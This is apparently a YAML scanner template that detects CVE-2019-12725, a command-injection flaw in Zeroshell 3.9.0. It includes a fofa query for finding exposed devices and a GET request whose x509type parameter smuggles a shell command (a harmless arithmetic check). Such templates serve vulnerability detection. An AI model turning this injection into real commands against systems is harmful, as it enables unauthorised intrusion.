id: CVE-2019-12725

info:
  name: Zeroshell 3.9.0 Remote Command Execution
  author: YekkoY
  severity: high
  verified: false
  description: |-
    ZeroShell 3.9.0 存在命令执行漏洞，/cgi-bin/kerbynet 页面，x509type 参数过滤不严格，导致攻击者可执行任意命令
    fofa: app="Zeroshell-防火墙"
  tags: cve,cve2019,zeroshell,rce
  created: 2021/01/12

set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)
rules:
  r0:
    request:
      method: GET
      path: /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aexpr%20{{r1}}%20-%20{{r2}}%0A%27
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 - r2)))
expression: r0()
